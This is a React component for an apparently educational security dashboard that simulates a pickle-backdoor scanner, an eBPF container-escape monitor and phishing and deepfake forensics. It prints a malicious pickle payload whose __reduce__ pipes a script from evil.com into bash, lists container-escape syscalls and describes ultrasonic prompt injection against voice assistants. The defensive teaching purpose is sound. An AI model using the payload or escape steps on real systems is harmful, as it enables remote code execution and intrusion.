import { useState, useEffect, useRef } from 'react';
import { Cloud, Package, Shield, AlertTriangle, CheckCircle2, Activity, Mail, AudioLines, Radio, Cpu, Zap } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { sfx } from '@/utils/soundEngine';
import { downloadFile } from '@/utils/downloads';

const PICKLE_PAYLOAD = `import pickle, os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ('curl https://evil.com/shell.sh | bash',))

# When loaded with pickle.load():
# → Arbitrary RCE via __reduce__ bytecode execution
malicious_weights = pickle.dumps(MaliciousModel())`;

const SAFETENSORS_CONVERSION = `# Converted to .safetensors — no code execution possible
from safetensors.torch import save_file

# Only tensor data, no Python bytecode
tensors = {
    "layer1.weight": model.layer1.weight,
    "layer1.bias": model.layer1.bias,
    # ... verified weights only
}
save_file(tensors, "model_weights.safetensors")

# CycloneDX AIBOM generated:
# - Component: model_weights.safetensors
# - Hash: sha256:a1b2c3...
# - Supplier: Verified
# - No executable code (safe to load)`;

const AIBOM_JSON = JSON.stringify({
  bomFormat: "CycloneDX",
  specVersion: "1.5",
  components: [
    {
      type: "machine-learning-model",
      name: "model_weights.safetensors",
      hashes: [{ alg: "SHA-256", content: "a1b2c3d4e5f6..." }],
      properties: [
        { name: "ai:model:task", value: "text-classification" },
        { name: "ai:model:framework", value: "pytorch" },
        { name: "ai:safety:verified", value: "true" },
        { name: "ai:safe_format", value: "safetensors" },
      ],
    },
  ],
}, null, 2);

const SYSCALLS = [
  { syscall: 'sys_execve', pid: 2847, comm: 'python3', args: '/tmp/.payload', threat: true, detail: 'Container attempting to execute binary from /tmp' },
  { syscall: 'sys_ptrace', pid: 2847, comm: 'python3', args: 'attach→pid=1', threat: true, detail: 'Attempting to ptrace PID 1 (container escape)' },
  { syscall: 'sys_mount', pid: 2847, comm: 'python3', args: '/proc /host_proc', threat: true, detail: 'Mounting host /proc — runc breakout detected' },
  { syscall: 'sys_execve', pid: 3021, comm: 'node', args: '/usr/bin/node', threat: false, detail: 'Normal Node.js process start' },
  { syscall: 'sys_capset', pid: 2847, comm: 'python3', args: 'CAP_SYS_ADMIN', threat: true, detail: 'Attempting to escalate to CAP_SYS_ADMIN' },
  { syscall: 'sys_open', pid: 3021, comm: 'node', args: '/app/config.json', threat: false, detail: 'Normal config file read' },
  { syscall: 'sys_socket', pid: 2847, comm: 'python3', args: 'AF_INET connect', threat: true, detail: 'Reverse shell outbound connection detected' },
];

const EMAIL_HEADERS = [
  { field: 'From', value: 'CEO@targetc0rp.com', issue: 'Typosquatting: "targetc0rp" vs "targetcorp"', threat: true },
  { field: 'Reply-To', value: 'attacker@evil.com', issue: 'Reply-To mismatch with From domain', threat: true },
  { field: 'SPF', value: 'softfail (ip=10.0.0.99)', issue: 'Sender IP not authorized by SPF record', threat: true },
  { field: 'DKIM', value: 'fail (bodyhash mismatch)', issue: 'Email body was modified after signing', threat: true },
  { field: 'DMARC', value: 'fail (p=none)', issue: 'DMARC policy set to none — no enforcement', threat: true },
  { field: 'Attachment', value: 'Invoice_2024.docm', issue: 'Macro-enabled document (.docm)', threat: true },
];

export function Workspace8() {
  const [subTab, setSubTab] = useState<'supply' | 'ebpf' | 'forensics'>('supply');
  const [scanned, setScanned] = useState(false);
  const [converted, setConverted] = useState(false);
  const [scanning, setScanning] = useState(false);

  // eBPF state
  const [ebpfActive, setEbpfActive] = useState(true);
  const [frozenPids, setFrozenPids] = useState<Set<number>>(new Set());
  const [syscallLog, setSyscallLog] = useState<{ syscall: string; pid: number; comm: string; args: string; threat: boolean; detail: string; timestamp: string }[]>([]);
  const logIdxRef = useRef(0);

  // Stream syscalls
  useEffect(() => {
    if (subTab !== 'ebpf') return;
    const interval = setInterval(() => {
      const entry = SYSCALLS[logIdxRef.current % SYSCALLS.length];
      logIdxRef.current++;
      const ts = new Date().toTimeString().split(' ')[0] + '.' + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
      setSyscallLog((prev) => [...prev.slice(-30), { ...entry, timestamp: ts }]);
      if (entry.threat && ebpfActive) {
        setFrozenPids((prev) => new Set([...prev, entry.pid]));
        sfx.alarm();
      }
    }, 1500);
    return () => clearInterval(interval);
  }, [subTab, ebpfActive]);

  const handleScan = () => {
    setScanning(true);
    sfx.radar();
    setTimeout(() => {
      setScanning(false);
      setScanned(true);
      sfx.breach();
    }, 2000);
  };

  const handleConvert = () => {
    setConverted(true);
    sfx.patch();
  };

  const handleDownloadAIBOM = () => {
    downloadFile('aibom-cyclonedx.json', AIBOM_JSON, 'application/json');
    sfx.success();
  };

  return (
    <div className="flex h-full flex-col p-2 gap-2 overflow-hidden">
      {/* Sub-tabs */}
      <div className="flex items-center gap-1 shrink-0">
        {[
          { id: 'supply' as const, label: 'AI Supply-Chain & Model Backdoor Scanner', icon: Package },
          { id: 'ebpf' as const, label: 'eBPF Kernel & Container Escape Monitor', icon: Cpu },
          { id: 'forensics' as const, label: 'Phishing & Deepfake Forensics', icon: Mail },
        ].map((t) => {
          const Icon = t.icon;
          return (
            <button
              key={t.id}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-semibold border transition-all ${
                subTab === t.id ? 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30' : 'bg-obsidian-850 text-slate-500 border-obsidian-700 hover:text-slate-300'
              }`}
              onClick={() => { setSubTab(t.id); sfx.tab(); }}
            >
              <Icon size={12} /> <span className="hidden lg:inline">{t.label}</span>
            </button>
          );
        })}
      </div>

      <div className="flex-1 overflow-auto">
        {subTab === 'supply' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-2 h-full">
            {/* Scanner */}
            <div className="panel flex flex-col overflow-hidden">
              <div className="panel-header">
                <Package size={12} className="text-cyan-400" />
                Model Weight Backdoor Scanner
              </div>
              <div className="flex-1 overflow-auto p-3 space-y-3">
                <div className="panel p-3">
                  <div className="text-[10px] text-slate-500 uppercase mb-1">Target File</div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-mono text-amber-400">model_weights.pkl</span>
                    <span className="badge-amber">Pickle</span>
                    <span className="text-[10px] text-slate-600">42.3 MB</span>
                  </div>
                  <div className="text-[10px] text-slate-600 mt-1">Source: huggingface.co/unverified-user/model-v2 <span className="text-slate-700">(simulated fixture)</span></div>
                </div>

                <div className="flex items-center gap-2">
                  <button className="btn-cyan flex items-center gap-1" onClick={handleScan} disabled={scanning || scanned}>
                    {scanning ? <Activity size={12} className="animate-spin" /> : <Shield size={12} />}
                    {scanning ? 'Scanning...' : scanned ? 'Scan Complete' : 'Scan for Backdoors'}
                  </button>
                  {scanned && !converted && (
                    <button className="btn-emerald flex items-center gap-1" onClick={handleConvert}>
                      <CheckCircle2 size={12} /> Convert to .safetensors + AIBOM
                    </button>
                  )}
                </div>

                {scanned && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-2">
                    <div className="panel p-3 border-crimson-600/30">
                      <div className="flex items-center gap-2 text-crimson-400 mb-2">
                        <AlertTriangle size={14} />
                        <span className="text-xs font-bold">CRITICAL: Malicious __reduce__ Detected</span>
                      </div>
                      <div className="terminal p-2 text-[10px] font-mono text-crimson-400 whitespace-pre-wrap">
                        {PICKLE_PAYLOAD}
                      </div>
                      <div className="text-[10px] text-slate-500 mt-2">
                        The <code className="text-crimson-400">__reduce__</code> method executes arbitrary Python bytecode when deserialized via <code className="text-crimson-400">pickle.load()</code>.
                        This is a Remote Code Execution vulnerability in the AI supply chain.
                      </div>
                    </div>
                  </motion.div>
                )}

                {converted && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="panel p-3 border-emerald-600/30">
                    <div className="flex items-center gap-2 text-emerald-400 mb-2">
                      <CheckCircle2 size={14} />
                      <span className="text-xs font-bold">Converted to .safetensors — Verified Safe</span>
                    </div>
                    <div className="terminal p-2 text-[10px] font-mono text-emerald-400 whitespace-pre-wrap">
                      {SAFETENSORS_CONVERSION}
                    </div>
                    <button className="btn-emerald w-full mt-2 flex items-center justify-center gap-1" onClick={handleDownloadAIBOM}>
                      <Package size={11} /> Download CycloneDX AIBOM (.json)
                    </button>
                  </motion.div>
                )}
              </div>
            </div>

            {/* Info panel */}
            <div className="panel flex flex-col overflow-hidden">
              <div className="panel-header">
                <Cloud size={12} className="text-cyan-400" />
                AI Supply-Chain Threat Intelligence
              </div>
              <div className="flex-1 overflow-auto p-3 space-y-3">
                <div className="panel p-3">
                  <div className="text-xs font-semibold text-slate-300 mb-2">Pickle vs Safetensors <span className="text-[9px] text-slate-600 font-normal">(educational simulation)</span></div>
                  <div className="grid grid-cols-2 gap-2">
                    <div className="panel p-2 border-crimson-600/20">
                      <div className="text-[10px] text-crimson-400 font-bold mb-1">Pickle (.pkl)</div>
                      <div className="text-[9px] text-slate-500">Can execute arbitrary Python code during deserialization. Never trust untrusted .pkl files.</div>
                    </div>
                    <div className="panel p-2 border-emerald-600/20">
                      <div className="text-[10px] text-emerald-400 font-bold mb-1">Safetensors</div>
                      <div className="text-[9px] text-slate-500">Only stores tensor data. Zero code execution. Industry standard for safe model sharing.</div>
                    </div>
                  </div>
                </div>
                <div className="panel p-3">
                  <div className="text-xs font-semibold text-slate-300 mb-2">Supply Chain Attack Vectors</div>
                  <div className="space-y-1.5">
                    {[
                      { vector: 'Model Weight Poisoning', desc: 'Backdoored weights trigger malicious behavior on specific inputs', severity: 'critical' },
                      { vector: 'Pickle RCE', desc: '__reduce__ executes arbitrary code on model load', severity: 'critical' },
                      { vector: 'Tokenizer Injection', desc: 'Malicious tokenizer files execute code during text processing', severity: 'high' },
                      { vector: 'Dependency Confusion', desc: 'Malicious PyPI package shadowing internal package name', severity: 'high' },
                      { vector: 'Fine-tune Data Poisoning', desc: 'Adversarial training data embeds trigger words', severity: 'medium' },
                    ].map((v) => (
                      <div key={v.vector} className="flex items-center gap-2 p-1.5 rounded bg-obsidian-800 border border-obsidian-700">
                        <span className={v.severity === 'critical' ? 'badge-crimson' : 'badge-amber'}>{v.severity}</span>
                        <div>
                          <div className="text-[10px] font-semibold text-slate-300">{v.vector}</div>
                          <div className="text-[9px] text-slate-600">{v.desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="panel p-3 border-cyan-600/20">
                  <div className="text-xs font-semibold text-cyan-400 mb-1">CycloneDX AIBOM Standard</div>
                  <div className="text-[10px] text-slate-400">
                    AI Bill of Materials (AIBOM) documents the full AI supply chain: model weights, training data provenance, framework versions, and safety verification status. Based on CycloneDX 1.5 ML extension.
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {subTab === 'ebpf' && (
          <div className="flex flex-col h-full gap-2">
            {/* eBPF status bar */}
            <div className="panel p-3 flex items-center gap-3 shrink-0">
              <div className={`w-2.5 h-2.5 rounded-full ${ebpfActive ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
              <span className="text-xs font-semibold text-slate-300">eBPF Kernel Monitor</span>
              <span className={ebpfActive ? 'badge-emerald' : 'badge-slate'}>{ebpfActive ? 'ACTIVE' : 'DISABLED'}</span>
              <span className="text-[10px] text-slate-600">Monitoring: sys_execve, sys_ptrace, sys_mount, sys_capset</span>
              <div className="flex-1" />
              <button
                className={`btn-tactical flex items-center gap-1 ${ebpfActive ? 'text-emerald-400' : ''}`}
                onClick={() => { setEbpfActive(!ebpfActive); sfx.toggle(); }}
              >
                <Cpu size={12} /> {ebpfActive ? 'eBPF Shield: ON' : 'eBPF Shield: OFF'}
              </button>
              <span className="text-[10px] text-slate-600">Frozen PIDs: {frozenPids.size}</span>
            </div>

            {/* Syscall telemetry stream */}
            <div className="panel flex-1 overflow-hidden flex flex-col">
              <div className="panel-header">
                <Activity size={12} className="text-cyan-400" />
                Live Kernel Syscall Telemetry — Container: ai-agent-pod-7b3f
              </div>
              <div className="flex-1 overflow-auto p-2 space-y-1">
                <AnimatePresence initial={false}>
                  {syscallLog.map((entry, i) => {
                    const isFrozen = frozenPids.has(entry.pid);
                    return (
                      <motion.div
                        key={i}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        className={`flex items-center gap-3 p-2 rounded-md border text-[10px] font-mono ${
                          entry.threat
                            ? isFrozen
                              ? 'bg-crimson-600/5 border-crimson-600/20'
                              : 'bg-crimson-600/15 border-crimson-600/40 animate-glow-crimson'
                            : 'bg-obsidian-800 border-obsidian-700'
                        }`}
                      >
                        <span className="text-slate-600 w-20 shrink-0">{entry.timestamp}</span>
                        <span className={`w-24 shrink-0 ${entry.threat ? 'text-crimson-400' : 'text-cyan-400'}`}>{entry.syscall}</span>
                        <span className="text-slate-500 w-12 shrink-0">pid={entry.pid}</span>
                        <span className="text-slate-400 w-16 shrink-0">{entry.comm}</span>
                        <span className={`flex-1 truncate ${entry.threat ? 'text-crimson-400' : 'text-slate-500'}`}>{entry.args}</span>
                        {entry.threat && (
                          <span className={`badge ${isFrozen ? 'badge-crimson' : 'badge-amber'} shrink-0`}>
                            {isFrozen ? 'SIGKILL FROZEN' : 'DETECTING...'}
                          </span>
                        )}
                      </motion.div>
                    );
                  })}
                </AnimatePresence>
              </div>
            </div>

            {/* Frozen containers */}
            {frozenPids.size > 0 && (
              <div className="panel p-3 border-crimson-600/20 shrink-0">
                <div className="flex items-center gap-2 text-crimson-400 mb-2">
                  <Zap size={12} />
                  <span className="text-xs font-bold">eBPF SIGKILL Policy Active</span>
                </div>
                <div className="text-[10px] text-slate-400">
                  {frozenPids.size} process(es) frozen by eBPF runtime policy. Container escape attempts (runc breakout, host /proc mount, CAP_SYS_ADMIN escalation) automatically terminated at kernel level.
                </div>
                <div className="text-[10px] text-emerald-400 mt-1 font-mono">
                  # eBPF policy: if (syscall == sys_mount && args contains "/host") → SIGKILL(pid)
                </div>
              </div>
            )}
          </div>
        )}

        {subTab === 'forensics' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-2 h-full">
            {/* Email forensics */}
            <div className="panel flex flex-col overflow-hidden">
              <div className="panel-header">
                <Mail size={12} className="text-cyan-400" />
                Email Header Forensics (SPF/DKIM/DMARC)
              </div>
              <div className="flex-1 overflow-auto p-3 space-y-2">
                <div className="panel p-3">
                  <div className="text-[10px] text-slate-500 uppercase mb-2">Suspicious Email Analysis</div>
                  <div className="space-y-1">
                    {EMAIL_HEADERS.map((h, i) => (
                      <div key={i} className={`p-2 rounded border ${h.threat ? 'bg-crimson-600/5 border-crimson-600/20' : 'bg-obsidian-800 border-obsidian-700'}`}>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] font-mono text-slate-500 w-20 shrink-0">{h.field}</span>
                          <span className={`text-[10px] font-mono ${h.threat ? 'text-crimson-400' : 'text-slate-400'}`}>{h.value}</span>
                          {h.threat && <span className="badge-crimson ml-auto">FAIL</span>}
                        </div>
                        {h.threat && <div className="text-[9px] text-slate-600 mt-1">{h.issue}</div>}
                      </div>
                    ))}
                  </div>
                </div>
                <div className="panel p-3 border-emerald-600/20">
                  <div className="text-[10px] text-emerald-400 uppercase mb-1 flex items-center gap-1"><CheckCircle2 size={10} /> Remediation</div>
                  <div className="text-[10px] text-slate-400 space-y-1">
                    <div>• Set DMARC policy to <code className="text-emerald-400">p=reject</code></div>
                    <div>• Enable DKIM signing with 2048-bit keys</div>
                    <div>• Block .docm attachments at mail gateway</div>
                    <div>• Deploy anti-spoofing: reject From domain mismatches</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Deepfake audio analyzer */}
            <div className="panel flex flex-col overflow-hidden">
              <div className="panel-header">
                <AudioLines size={12} className="text-cyan-400" />
                Acoustic Deepfake & Vishing Analyzer
              </div>
              <div className="flex-1 overflow-auto p-3 space-y-3">
                <div className="text-[10px] text-slate-500">
                  AI Voice Cloning / Vishing Deepfakes are detected via spectral analysis. Synthetic speech exhibits uniform frequency distributions and lacks natural micro-variations in pitch. <span className="text-slate-700">(Simulated waveform for demonstration)</span>
                </div>

                {/* Spectrogram visualization */}
                <div className="terminal p-3 relative">
                  <div className="text-[9px] text-slate-600 uppercase mb-2">Spectral Audio Waveform <span className="text-slate-700">(simulated)</span></div>
                  <svg viewBox="0 0 300 120" className="w-full h-32">
                    {/* Frequency grid */}
                    {[30, 60, 90].map((y) => (
                      <line key={y} x1="0" y1={y} x2="300" y2={y} stroke="#1A2236" strokeWidth="0.5" />
                    ))}
                    {/* Natural voice waveform */}
                    <path
                      d={Array.from({ length: 60 }, (_, i) => {
                        const x = i * 5;
                        const y = 60 + Math.sin(i * 0.3) * 15 + Math.sin(i * 1.7) * 5 + (Math.random() - 0.5) * 3;
                        return `${i === 0 ? 'M' : 'L'} ${x} ${y}`;
                      }).join(' ')}
                      fill="none" stroke="#06B6D4" strokeWidth="1.5" opacity="0.6"
                    />
                    {/* Synthetic deepfake waveform (too uniform) */}
                    <path
                      d={Array.from({ length: 60 }, (_, i) => {
                        const x = i * 5;
                        const y = 90 + Math.sin(i * 0.5) * 8;
                        return `${i === 0 ? 'M' : 'L'} ${x} ${y}`;
                      }).join(' ')}
                      fill="none" stroke="#EF4444" strokeWidth="1.5" opacity="0.7"
                    />
                    {/* Ultrasonic anomaly markers */}
                    {[50, 120, 190, 250].map((x) => (
                      <g key={x}>
                        <circle cx={x} cy="15" r="3" fill="#F59E0B" opacity="0.6" />
                        <text x={x} y="10" textAnchor="middle" fill="#F59E0B" fontSize="4">20kHz+</text>
                      </g>
                    ))}
                  </svg>
                  <div className="flex gap-3 mt-1">
                    <span className="flex items-center gap-1 text-[8px] text-slate-500">
                      <div className="w-2 h-0.5 bg-cyan-500" /> Natural Voice
                    </span>
                    <span className="flex items-center gap-1 text-[8px] text-slate-500">
                      <div className="w-2 h-0.5 bg-crimson-500" /> Synthetic (Deepfake)
                    </span>
                    <span className="flex items-center gap-1 text-[8px] text-slate-500">
                      <div className="w-1.5 h-1.5 rounded-full bg-amber-500" /> Ultrasonic Anomaly
                    </span>
                  </div>
                </div>

                <div className="panel p-3 border-crimson-600/20">
                  <div className="flex items-center gap-2 text-crimson-400 mb-1">
                    <AlertTriangle size={12} />
                    <span className="text-xs font-bold">DEEPFAKE DETECTED — Confidence: 94.7% <span className="text-[9px] text-slate-600 font-normal">(simulated fixture)</span></span>
                  </div>
                  <div className="text-[10px] text-slate-400 space-y-1">
                    <div>• Spectral uniformity: 0.91 (threshold: 0.75) — too regular for natural speech</div>
                    <div>• Missing micro-breaths and pitch jitter</div>
                    <div>• Ultrasonic anomalies at 20kHz+ — possible acoustic prompt injection carrier</div>
                    <div>• Voice fingerprint: no match in executive voiceprint database</div>
                  </div>
                </div>

                <div className="panel p-3 border-amber-600/20">
                  <div className="flex items-center gap-2 text-amber-400 mb-1">
                    <Radio size={12} />
                    <span className="text-xs font-bold">Ultrasonic Acoustic Prompt Injection</span>
                  </div>
                  <div className="text-[10px] text-slate-400">
                    Hidden high-frequency audio commands ({'>18kHz'}, inaudible to humans) can trigger AI voice assistants. Detected 4 ultrasonic bursts consistent with embedded command injection.
                  </div>
                </div>

                <div className="panel p-3 border-emerald-600/20">
                  <div className="text-[10px] text-emerald-400 uppercase mb-1 flex items-center gap-1"><CheckCircle2 size={10} /> Defense Recommendations</div>
                  <div className="text-[10px] text-slate-400 space-y-1">
                    <div>• Deploy spectral voice authentication (liveness detection)</div>
                    <div>• High-pass filter: reject audio signals above 18kHz</div>
                    <div>• Verify caller identity via out-of-band channel</div>
                    <div>• Train staff on vishing social engineering awareness</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
